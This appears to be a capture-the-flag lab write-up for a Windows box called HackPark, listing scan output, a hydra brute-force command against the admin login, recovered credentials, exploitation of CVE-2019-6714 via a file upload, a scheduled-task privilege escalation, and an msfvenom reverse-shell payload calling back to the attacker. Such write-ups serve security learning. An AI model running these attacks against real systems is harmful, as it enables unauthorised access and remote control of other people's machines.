Hack_Park.doc
=================

name : Eviyatar Cohen

Date : 1/10/2022

IP = 10.10.194.183
-------------------------------------------------------

Nmap Results :
================
nmap -sC -sV 10.10.194.183
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-01 01:44 EDT
Nmap scan report for 10.10.194.183
Host is up (0.087s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 8.5
| http-robots.txt: 6 disallowed entries 
| /Account/*.* /search /search.aspx /error404.aspx 
|_/archive /archive.aspx
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: hackpark | hackpark amusements
|_http-server-header: Microsoft-IIS/8.5
3389/tcp open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: HACKPARK
|   NetBIOS_Domain_Name: HACKPARK
|   NetBIOS_Computer_Name: HACKPARK
|   DNS_Domain_Name: hackpark
|   DNS_Computer_Name: hackpark
|   Product_Version: 6.3.9600
|_  System_Time: 2022-10-01T05:45:29+00:00
|_ssl-date: 2022-10-01T05:45:30+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=hackpark
| Not valid before: 2022-09-30T05:40:20
|_Not valid after:  2023-04-01T05:40:20
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 85.81 seconds

-------------------------------------------------------------------------

GoBuster Results:
=====================
gobuster dir -u http://10.10.194.183 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.194.183
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/10/01 01:54:28 Starting gobuster in directory enumeration mode
===============================================================
/contact              (Status: 200) [Size: 9935]
/blog                 (Status: 500) [Size: 1208]
/search               (Status: 200) [Size: 8407]
/archives             (Status: 200) [Size: 8326]
/default              (Status: 500) [Size: 1763]
/archive              (Status: 200) [Size: 8325]
/content              (Status: 301) [Size: 152] [--> http://10.10.194.183/content/]
/contactus            (Status: 200) [Size: 9937]                                   
/Default              (Status: 500) [Size: 1763]                                   
/contacts             (Status: 200) [Size: 9936]                                   
/contact_us           (Status: 200) [Size: 9938]                                   
/scripts              (Status: 301) [Size: 152] [--> http://10.10.194.183/scripts/]
/account              (Status: 301) [Size: 152] [--> http://10.10.194.183/account/]
/admin                (Status: 302) [Size: 173] [--> http://10.10.194.183/Account/login.aspx?ReturnURL=/admin]

-----------------------------------------------------------------------

Found Login Page in /admin :
================================

Payload For Bruteforce Website Login:
---------------------------------------
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.194.183 http-post-form "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=KOZQvgRj1XFoy59oMcXSMlYspVg1ZU2vqUDcuU8reRwqJG1kRELByNKgKqDuYrQSV7E18U9d7bRfK7a0Vpa1EumyCFAQKhzEZ3UXEsrEMSRamKOKNGOok%2BT5tFurBMFHJ9f%2F052nDCgsAWzCWr05etRWw6TPMJuZs0EX2TF7m0bQgKaFEz4rnwfHVHkFbtodNUG%2Bj4aig4LKJjNeZUk934UfU%2FMq3y3TyPjLKHjeEKwv50zZdm%2FGKkKeoGVRIRAc6OBHCjgl9vfQdCNacurq7iBBjlRxi1TQuJ5AGW1Adg%2FGQmqKZX7QbOD3d5w%2FVn9ZwhxB3rpzMVBxrjuyXee53xs%2F%2BlrD05lZvSBReMeyleCXcLPs&__EVENTVALIDATION=%2Fk2eqWplIHoBHqKxVZ4UcTcb5unKn7RxTh0a9vnxw21CnaNOxqUTfByi1PCIb4%2BjZkh6t1vRsfGDS296i4UcupUd0m%2BkoBJK9dEpZsEgNYg4V6i3At69Oe%2BbHNN3Xo%2FjQiPygecLa8t7Ir0YXmqPWVzbm9TQb972rKZGTEx8Zktr7upf&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed"

---------------------------------------

Found Credentials!!
====================
admin:1qaz2wsx

Using CVE-2019-6714 To get a shell to the mechine :
----------------------------------------------------
Need To Upload The File As PostView.ascx and go to http://<ip>/?theme=../../App_Data/files

after it i Used WindowsScheduler to mv Message.exe to bak file and 
insted of it put my shell file to get root shell using Msfvenom


Payload Of Msfvenom :
=========================
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.18.26.95 LPORT=9001 -f exe > shell.exe


